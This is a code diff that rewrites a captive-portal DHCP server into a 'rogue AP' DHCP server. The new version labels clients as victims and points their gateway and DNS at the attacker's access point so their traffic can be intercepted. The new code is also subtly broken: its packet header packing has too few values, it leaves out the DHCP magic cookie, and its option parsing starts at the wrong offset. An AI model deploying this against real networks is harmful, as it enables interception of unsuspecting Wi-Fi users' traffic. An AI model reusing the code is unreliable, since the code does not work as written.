@@ -1,210 +1,201 @@
-"""Userland DHCP server for the captive-portal AP.
+"""Minimal DHCP server for the rogue AP. All in userland, no dnsmasq."""
 
-Operates over raw 802.11 data frames (no kernel sockets).  The server
-assigns IPs from a configurable pool and responds to Discover/Request
-with Offer/Ack, pointing clients at the portal IP for gateway and DNS.
-"""
-from __future__ import annotations
-
-import logging
 import struct
 import time
-from dataclasses import dataclass, field
-from typing import Callable, Optional
-
-log = logging.getLogger(__name__)
-
-# DHCP constants
-_BOOTREQUEST = 1
-_BOOTREPLY = 2
-_MAGIC_COOKIE = bytes([0x63, 0x82, 0x53, 0x63])
-
-# DHCP options
-OPT_SUBNET_MASK = 1
-OPT_ROUTER = 3
-OPT_DNS_SERVER = 6
-OPT_REQUESTED_IP = 50
-OPT_MESSAGE_TYPE = 53
-OPT_SERVER_ID = 54
-OPT_LEASE_TIME = 51
-OPT_END = 255
-
-# DHCP message types
-DHCPDISCOVER = 1
-DHCPOFFER = 2
-DHCPREQUEST = 3
-DHCPACK = 5
-DHCPNAK = 6
+import threading
+from typing import Callable
 
 
-@dataclass
-class Lease:
-    mac: str
-    ip: str
-    expires: float
+GATEWAY = "10.0.0.1"
+SUBNET = "255.255.255.0"
+DNS_SERVER = "10.0.0.1"
+LEASE_TIME = 3600
+IP_POOL_START = 100
+IP_POOL_END = 200
 
 
-@dataclass
-class DhcpServer:
-    """Minimal stateful DHCP server running over raw frames.
+class DHCPState:
+    def __init__(self):
+        self._leases: dict[bytes, tuple[bytes, float]] = {}
+        self._next_ip = IP_POOL_START
+        self._lock = threading.Lock()
 
-    The ``send_ip`` callback wraps the reply into an 802.11 data frame
-    and injects it.  ``handle_dhcp`` is called from the data-frame RX
-    path with the UDP payload already extracted.
-    """
-    gateway_ip: str = "192.168.4.1"
-    subnet_mask: str = "255.255.255.0"
-    ip_start: str = "192.168.4.10"
-    ip_end: str = "192.168.4.200"
-    lease_sec: int = 3600
-    send_ip: Optional[Callable[[str, bytes], None]] = None  # (client_ip, udp_payload)
+    def assign_ip(self, mac: bytes) -> bytes:
+        with self._lock:
+            if mac in self._leases:
+                ip, expiry = self._leases[mac]
+                if time.time() < expiry:
+                    return ip
 
-    _leases: dict[str, Lease] = field(default_factory=dict)
-    _next_ip_counter: int = 0
+            while self._next_ip <= IP_POOL_END:
+                ip = bytes([10, 0, 0, self._next_ip])
+                conflict = False
+                for m, (i, e) in self._leases.items():
+                    if i == ip and time.time() < e:
+                        conflict = True
+                        break
+                if not conflict:
+                    self._leases[mac] = (ip, time.time() + LEASE_TIME)
+                    self._next_ip += 1
+                    return ip
 
-    def __post_init__(self) -> None:
-        self._ip_pool_start = self._ip_to_int(self.ip_start)
-        self._ip_pool_end = self._ip_to_int(self.ip_end)
+            oldest_mac, (oldest_ip, _) = min(
+                self._leases.items(), key=lambda x: x[1][1]
+            )
+            self._leases[mac] = (oldest_ip, time.time() + LEASE_TIME)
+            return oldest_ip
 
-    # ----- public API --------------------------------------------------------
-
-    def handle_dhcp(self, raw_udp: bytes, src_mac: str) -> Optional[bytes]:
-        """Process a DHCP payload (UDP data, no IP/UDP headers).  Returns the
-        DHCP reply payload, or None if nothing to send."""
-        if len(raw_udp) < 240:
-            return None
-        msg_type_opt = self._get_option(raw_udp, OPT_MESSAGE_TYPE)
-        if msg_type_opt is None:
-            return None
-        msg_type = msg_type_opt[0]
-
-        client_mac_raw = raw_udp[28:34]
-        client_mac_str = ":".join(f"{b:02x}" for b in client_mac_raw)
-
-        if msg_type == DHCPDISCOVER:
-            return self._handle_discover(raw_udp, client_mac_str)
-        if msg_type == DHCPREQUEST:
-            return self._handle_request(raw_udp, client_mac_str)
+    def get_ip(self, mac: bytes) -> bytes | None:
+        with self._lock:
+            if mac in self._leases:
+                ip, expiry = self._leases[mac]
+                if time.time() < expiry:
+                    return ip
         return None
 
-    def get_lease_ip(self, mac: str) -> Optional[str]:
-        """Return the currently-leased IP for *mac*, or None."""
-        lease = self._leases.get(mac)
-        if lease and lease.expires > time.time():
-            return lease.ip
-        return None
 
-    # ----- internals ---------------------------------------------------------
+_dhcp_state = DHCPState()
 
-    def _handle_discover(self, pkt: bytes, mac: str) -> bytes:
-        ip = self._assign_ip(mac)
-        if ip is None:
-            log.warning("DHCP pool exhausted")
-            return self._nak(pkt, mac)
-        return self._build_offer(pkt, mac, ip)
 
-    def _handle_request(self, pkt: bytes, mac: str) -> bytes:
-        req_ip_opt = self._get_option(pkt, OPT_REQUESTED_IP)
-        if req_ip_opt:
-            req_ip = ".".join(str(b) for b in req_ip_opt)
-        else:
-            req_ip = self._assign_ip(mac)
-            if req_ip is None:
-                return self._nak(pkt, mac)
+def handle_dhcp(ip_packet: bytes, victim_mac: bytes, send_fn: Callable):
+    """Parse DHCP message and send appropriate response."""
+    udp = ip_packet[20:]
+    if len(udp) < 236 + 8:
+        return
+    dhcp_msg = udp[8:]
 
-        self._leases[mac] = Lease(mac=mac, ip=req_ip,
-                                  expires=time.time() + self.lease_sec)
-        return self._build_ack(pkt, mac, req_ip)
+    xid = dhcp_msg[4:8]
+    chaddr = dhcp_msg[28:34]
 
-    def _assign_ip(self, mac: str) -> Optional[str]:
-        existing = self._leases.get(mac)
-        if existing and existing.expires > time.time():
-            return existing.ip
-        for _ in range(self._ip_pool_end - self._ip_pool_start + 1):
-            candidate = self._int_to_ip(self._ip_pool_start + self._next_ip_counter)
-            self._next_ip_counter = (self._next_ip_counter + 1) % (
-                self._ip_pool_end - self._ip_pool_start + 1)
-            taken = any(lease.ip == candidate and lease.expires > time.time()
-                        for lease in self._leases.values())
-            if not taken:
-                return candidate
-        return None
+    msg_type = None
+    i = 236
+    while i < len(dhcp_msg):
+        opt = dhcp_msg[i]
+        if opt == 0:
+            break
+        if opt == 255:
+            i += 1
+            continue
+        length = dhcp_msg[i + 1]
+        if opt == 53 and length >= 1:
+            msg_type = dhcp_msg[i + 2]
+        i += 2 + length
 
-    def _build_offer(self, pkt: bytes, mac: str, ip: str) -> bytes:
-        xid = pkt[4:8]
-        return self._build_bootp(pkt, mac, ip, xid, DHCPOFFER)
+    if msg_type == 1:
+        client_ip = _dhcp_state.assign_ip(chaddr)
+        response = _build_dhcp_reply(
+            xid=xid,
+            chaddr=chaddr,
+            yiaddr=client_ip,
+            msg_type=2,
+            options={
+                1: bytes([255, 255, 255, 0]),
+                3: bytes([10, 0, 0, 1]),
+                6: bytes([10, 0, 0, 1]),
+                51: struct.pack('>I', LEASE_TIME),
+                54: bytes([10, 0, 0, 1]),
+            }
+        )
+        _send_dhcp(victim_mac, response, send_fn, broadcast=True)
 
-    def _build_ack(self, pkt: bytes, mac: str, ip: str) -> bytes:
-        xid = pkt[4:8]
-        return self._build_bootp(pkt, mac, ip, xid, DHCPACK)
+    elif msg_type == 3:
+        client_ip = _dhcp_state.get_ip(chaddr) or bytes([10, 0, 0, IP_POOL_START])
+        response = _build_dhcp_reply(
+            xid=xid,
+            chaddr=chaddr,
+            yiaddr=client_ip,
+            msg_type=5,
+            options={
+                1: bytes([255, 255, 255, 0]),
+                3: bytes([10, 0, 0, 1]),
+                6: bytes([10, 0, 0, 1]),
+                51: struct.pack('>I', LEASE_TIME),
+                54: bytes([10, 0, 0, 1]),
+            }
+        )
+        _send_dhcp(victim_mac, response, send_fn, broadcast=True)
 
-    def _nak(self, pkt: bytes, mac: str) -> bytes:
-        xid = pkt[4:8]
-        return self._build_bootp(pkt, mac, "0.0.0.0", xid, DHCPNAK)
+    elif msg_type == 7:
+        with _dhcp_state._lock:
+            _dhcp_state._leases.pop(chaddr, None)
 
-    def _build_bootp(self, pkt: bytes, mac: str, ip: str,
-                     xid: bytes, msg_type: int) -> bytes:
-        """Build a DHCP reply (BOOTP packet + options)."""
-        client_mac_raw = bytes(int(o, 16) for o in mac.split(":"))
-        # Fixed BOOTP fields
-        reply = bytearray(240)
-        reply[0] = _BOOTREPLY
-        reply[1] = 1  # htype (Ethernet)
-        reply[2] = 6  # hlen
-        reply[3] = 0  # hops
-        reply[4:8] = xid  # xid (echo from request)
-        reply[8:10] = b"\x00\x00"  # secs
-        reply[10:12] = b"\x00\x00"  # flags
-        reply[12:16] = b"\x00\x00\x00\x00"  # ciaddr
-        ip_bytes = self._ip_to_bytes(ip)
-        reply[16:20] = ip_bytes  # yiaddr
-        reply[20:24] = ip_bytes  # siaddr (server)
-        reply[24:28] = self._ip_to_bytes(self.gateway_ip)  # giaddr
-        reply[28:34] = client_mac_raw
-        # Pad to 240 bytes, then magic cookie
-        reply_bytes = bytes(reply)
-        options = self._build_options(msg_type, ip)
-        return reply_bytes + _MAGIC_COOKIE + options
 
-    def _build_options(self, msg_type: int, client_ip: str) -> bytes:
-        opts = bytearray()
-        opts += bytes([OPT_MESSAGE_TYPE, 1, msg_type])
-        opts += bytes([OPT_SUBNET_MASK, 4]) + self._ip_to_bytes(self.subnet_mask)
-        opts += bytes([OPT_ROUTER, 4]) + self._ip_to_bytes(self.gateway_ip)
-        opts += bytes([OPT_DNS_SERVER, 4]) + self._ip_to_bytes(self.gateway_ip)
-        opts += bytes([OPT_LEASE_TIME, 4]) + struct.pack(">I", self.lease_sec)
-        opts += bytes([OPT_SERVER_ID, 4]) + self._ip_to_bytes(self.gateway_ip)
-        opts += bytes([OPT_END])
-        return bytes(opts)
+def _build_dhcp_reply(xid: bytes, chaddr: bytes, yiaddr: bytes, msg_type: int,
+                      options: dict) -> bytes:
+    """Build a complete DHCP reply (BootReply)."""
+    header = struct.pack(
+        '<BBBBIHHIIIIII',
+        2,
+        1,
+        6,
+        0,
+        struct.unpack('>I', xid)[0],
+        0,
+        0,
+        0,
+        struct.unpack('>I', yiaddr)[0] if isinstance(yiaddr, bytes) else 0,
+        0,
+        0,
+    )
+    header += chaddr + b'\x00' * (16 - len(chaddr))
+    header += b'\x00' * 64 + b'\x00' * 128
 
-    # ----- helpers ------------------------------------------------------------
+    opts = b''
+    for opt_num, value in options.items():
+        opts += bytes([opt_num, len(value)]) + value
+    opts += b'\xFF'
 
-    @staticmethod
-    def _get_option(pkt: bytes, opt_id: int) -> Optional[bytes]:
-        i = 240 + 4  # skip BOOTP fixed + magic cookie
-        while i < len(pkt):
-            if pkt[i] == OPT_END:
-                break
-            if pkt[i] == 0:  # padding
-                i += 1
-                continue
-            oid = pkt[i]
-            olen = pkt[i + 1]
-            if oid == opt_id:
-                return pkt[i + 2: i + 2 + olen]
-            i += 2 + olen
-        return None
+    return header + opts
 
-    @staticmethod
-    def _ip_to_int(ip: str) -> int:
-        parts = ip.split(".")
-        return (int(parts[0]) << 24 | int(parts[1]) << 16 |
-                int(parts[2]) << 8 | int(parts[3]))
 
-    @staticmethod
-    def _int_to_ip(n: int) -> str:
-        return f"{(n >> 24) & 0xFF}.{(n >> 16) & 0xFF}.{(n >> 8) & 0xFF}.{n & 0xFF}"
+def _send_dhcp(victim_mac: bytes, dhcp_payload: bytes, send_fn: Callable,
+               broadcast: bool = True):
+    """Wrap DHCP in UDP then IP then send via 802.11."""
+    dst_ip = b'\xff\xff\xff\xff' if broadcast else _dhcp_state.get_ip(victim_mac)
 
-    @staticmethod
-    def _ip_to_bytes(ip: str) -> bytes:
-        return bytes(int(o) for o in ip.split("."))
+    udp_len = 8 + len(dhcp_payload)
+    udp = struct.pack('>HHHH', 67, 68, udp_len, 0) + dhcp_payload
+
+    ip = _build_ipv4_packet(
+        src=b'\x0a\x00\x00\x01',
+        dst=dst_ip,
+        proto=17,
+        payload=udp
+    )
+
+    send_fn(victim_mac, ip)
+
+
+def _build_ipv4_packet(src: bytes, dst: bytes, proto: int, payload: bytes) -> bytes:
+    """Build a minimal IPv4 packet with correct checksum."""
+    total_len = 20 + len(payload)
+    ip_id = int(time.time() * 1000) & 0xFFFF
+    header = struct.pack(
+        '!BBHHHBBH4s4s',
+        0x45,
+        0,
+        total_len,
+        ip_id,
+        0,
+        64,
+        proto,
+        0,
+        src,
+        dst
+    )
+    checksum = _ipv4_checksum(header)
+    header = struct.pack(
+        '!BBHHHBBH4s4s',
+        0x45, 0, total_len, ip_id, 0, 64, proto, checksum, src, dst
+    )
+    return header + payload
+
+
+def _ipv4_checksum(header: bytes) -> int:
+    """Calculate IPv4 header checksum."""
+    if len(header) % 2:
+        header += b'\x00'
+    total = sum(struct.unpack('!%dH' % (len(header) // 2), header))
+    total = (total >> 16) + (total & 0xFFFF)
+    total += total >> 16
+    return ~total & 0xFFFF
